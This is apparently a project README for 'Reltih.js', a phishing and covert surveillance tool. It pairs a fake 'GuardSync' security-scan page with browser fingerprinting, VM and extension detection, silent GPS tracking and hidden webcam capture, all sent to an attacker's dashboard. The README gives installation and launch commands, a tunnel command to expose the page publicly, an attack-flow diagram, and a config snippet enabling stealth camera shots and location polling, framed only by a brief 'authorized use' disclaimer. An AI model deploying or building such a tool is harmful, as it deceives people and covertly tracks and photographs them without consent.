<div align="center">

![header](https://capsule-render.vercel.app/api?type=waving&height=300&color=0f1025&text=Reltih.js&textBg=false&fontColor=ffff)

![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Flask](https://img.shields.io/badge/Flask-Waitress-000000?style=for-the-badge&logo=flask&logoColor=white)
![JavaScript](https://img.shields.io/badge/JavaScript-Payloads-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
![Status](https://img.shields.io/badge/Status-Active-34A853?style=for-the-badge)

</div>

---

## `$ Overview`

Reltih.js is a highly stealthy fingerprinting and reconnaissance framework designed for **authorized Red Team operations**. It deploys a persuasive "Zero-Trust Security" facade (GuardSync) to deceive targets, while covertly extracting deep browser telemetry, hardware specifications, live location data, and webcam captures before gaining internal access. 

> **This tool is strictly for educational purposes and authorized penetration testing only. Unauthorized use is illegal.**

---

## `$ Screenshots`

### `$GuardSync Phishing Facade`

![Client Phishing Page / GuardSync](https://github.com/iNarrow12/Reltih.js/blob/main/src/Screenshot%202026-04-13%20201559.png?raw=true)

### `$Command Dashboard`

![Dashboard Page](https://github.com/iNarrow12/Reltih.js/blob/main/src/Screenshot%202026-04-13%20214855.png?raw=true)

---

## `$ Tree Overview`

```
.
├── server.py                  # Main Flask backend API
├── engine.py                  # Risk Scoring and Bot Classification Engine
├── index.html                 # Decoy GuardSync phishing landing page
├── dashboard.html             # Real-time monitoring dashboard
├── fp/                        # Fingerprinting payload modules
│   ├── behavioral.js          # User interaction & bot heuristics
│   ├── browser.js             # Browser brand, version & features
│   ├── codecs.js              # Media capabilities & webRTC profiling
│   ├── core.js                # Aggregation & webhook orchestrator 
│   ├── environment.js         # Hardware context flagger
│   ├── extensions.js          # Installed extension detector
│   ├── gpu_ram.js             # Graphics renderer & memory profiler
│   ├── hardware.js            # Processor, battery & pointer enumeration
│   ├── murmur.js              # WebGL, Canvas, Audio & Font hashing
│   ├── network.js             # Local/Public IPs & GeoIP fetching
│   ├── os.js                  # OS, kernel & driver enumeration
│   ├── permissions.js         # API access rights tracking
│   ├── storage.js             # Local session footprinting
│   ├── surveillance.js        # Webcam and live GPS capture
│   └── timing.js              # Execution speed forensics
└── Database/                  # Auto-generated device intel storage
```

---

## `$ Features`

| Module | Description |
|--------|-------------|
| **Phishing Facade** | Convincing "GuardSync" Zero-Trust login simulation |
| **Deep Fingerprinting** | WebGL, Canvas, Audio, and Font hashing via `murmur.js` |
| **VM/Sandbox Detection** | Evaluates CPU cores, RAM, GPU renderer, and interaction anomalies |
| **Location Tracking** | Silent GPS and IP trailing with real-time accuracy mapping |
| **Covert Camera** | Stealth webcam image capture and base64 remote extraction |
| **Risk Scoring Engine** | Evaluates trust based on hardware context, returning low/high risk flags |
| **Live Dashboard** | Terminal-styled real-time device monitoring with session viewer |

---

## `$ Payload Modules (fp/)`

The `fp/` directory contains the modular JavaScript payloads injected into the target's browser. They run silently to extract deep metrics before tunneling data back to the Flask API.

| Module File | Functionality |
|-------------|---------------|
| `behavioral.js`| Evaluates mouse movement, typing speeds, and interaction heuristics to detect headless bots. |
| `browser.js` | Fingerprints the true browser brand, full version context, plugins, and feature flags. |
| `codecs.js`  | Probes for supported media codecs, WebRTC leak points, and DRM capabilities. |
| `core.js`    | The central orchestrator that aggregates all data payloads and tunnels them to the backend API. |
| `environment.js`| Analyzes high-level hardware constraints (Battery, Touch, Pointer) to flag Virtual Machines. |
| `extensions.js`| Scans internal browser object models to detect commonly installed security extensions. |
| `gpu_ram.js` | Profiles the graphics rendering engine, video memory, and device RAM size constraints. |
| `hardware.js`| Enumerates CPU architecture, physical core counts, and peripheral types connected to the machine. |
| `murmur.js`  | Calculates robust device fingerprints via WebGL, Canvas, Audio oscillators, and System Fonts. |
| `network.js` | Extracts WebRTC local IPs, internal network topology, and integrates external GeoIP APIs. |
| `os.js`      | Details the Operating System version, platform build, and underlying kernel architecture. |
| `permissions.js`| Checks what hardware access APIs (camera, mic, location) the user has already approved. |
| `storage.js` | Measures local storage quotas, indexedDB capabilities, and session footprint sizes. |
| `surveillance.js`| Core module executing stealth physical intelligence collection (Webcam snapshots and Live GPS tracing). |
| `timing.js`  | Collects forensic performance execution timings to detect sluggish sandboxed environments. |

---

## `$ Configuration & Payload Toggles`

You can manually configure the intensity of the exploit by modifying the toggles in `index.html`. Locate the `Surveillance.init()` execution block to adjust settings:

```javascript
try {
    const result = await Surveillance.init(deviceId, {
        enableLocation: true,   // Set to TRUE to trigger accurate GPS polling
        enableCamera: true,     // Set to TRUE to initiate stealth Webcam capture
        camShots: 13            // Configure the number of consecutive photos to extract
    });
    console.log('Surveillance started:', result);
} catch (e) {
    console.warn('Surveillance failed or blocked:', e);
}
```

*   **`enableLocation`**: Polls High-Accuracy GPS data using `navigator.geolocation`. If permission is not granted, IP-based trailing is used as a fallback.
*   **`enableCamera`**: Activates the target's webcam silently inside a hidden video element, snapping frames.
*   **`camShots`**: Defines exactly how many surveillance snapshots should be generated and uploaded to the `Database/` directory.

---

## `$ Installation`

```bash
git clone https://github.com/iNarrow12/Reltih.js.git
cd Reltih.js
pip install flask waitress requests
```

---

## `$ Usage`

```bash
# Start the backend server (Waitress WSGI on port 5000)
python server.py
```

| URL | Description |
|-----|-------------|
| `http://localhost:5000/` | Target-facing GuardSync facade |
| `http://localhost:5000/dashboard` | Internal monitoring dashboard |

---

## `$ Exposing Publicly`

```bash
cloudflared tunnel --url http://localhost:5000
```

---

## `$ Attack Flow`

```
Target visits deceptive URL
      |
      v
Interacts with "GuardSync" Security Scan
      |
      v
Fingerprinting modules (fp/*) execute silently  <- IPs, Hardware, Hashes sent to server
      |
      v
Risk engine evaluates trust (VM / Bot / Sandbox)
      |
      v
Covert GPS and Camera payloads triggered        <- Location and Photos captured
      |
      v
Red Teamer views deep intelligence on Dashboard
```

---

## `$ Admin Dashboard`

| Feature | Description |
|---------|-------------|
| Live Devices | View all captured targets with their last seen status |
| Trust Analysis | Automatic `LOW RISK` / `HIGH RISK` scoring computed by the engine |
| Identity Overview | Exact OS, Browser, GPU, memory, and geographical IP profiling |
| Session Traces | Detailed JSON-formatted history of network interactions |
| Camera Viewer | Access remotely captured webcam screenshots from targets |

---

## `$ Logging`

All intelligence is securely stored inside the `Database/` directory per-device structure:

```
Database/
└── <DeviceID_Hex>/
    ├── meta.json                # Aggregate trust scores and hardware profile
    ├── sessions/                # Raw telemetry JSONs per interaction
    ├── locations/               # GPS tracking trails
    └── camshots/                # Captured target images (.png)
```

---

## `$ License`

MIT — For authorized security research, red teaming, and educational use only.

<div align="center">

![footer](https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12,20,24&height=100&section=footer)

</div>
